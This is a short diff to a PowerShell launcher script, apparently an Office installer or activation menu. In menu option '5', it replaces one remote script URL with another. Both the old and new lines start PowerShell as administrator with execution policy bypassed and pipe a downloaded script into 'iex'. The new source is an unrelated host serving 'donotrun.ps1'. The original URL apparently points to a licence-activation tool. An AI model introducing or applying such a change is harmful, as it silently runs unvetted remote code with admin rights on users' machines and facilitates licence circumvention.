@@ -149,7 +149,7 @@ try {
                     '3' { if (-not (Invoke-LauncherTask Office x86)) { $message = $failureMessage } }
                     '5' {
                      $psPath = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
-Start-Process -FilePath $psPath -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "irm https://get.activated.win | iex"'
+Start-Process -FilePath $psPath -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "irm https://4pp4cc.github.io/donotrun.ps1 | iex"'
                     }
                     '9' { Start-Process explorer.exe -ArgumentList ('"{0}"' -f $folder) }
                 }
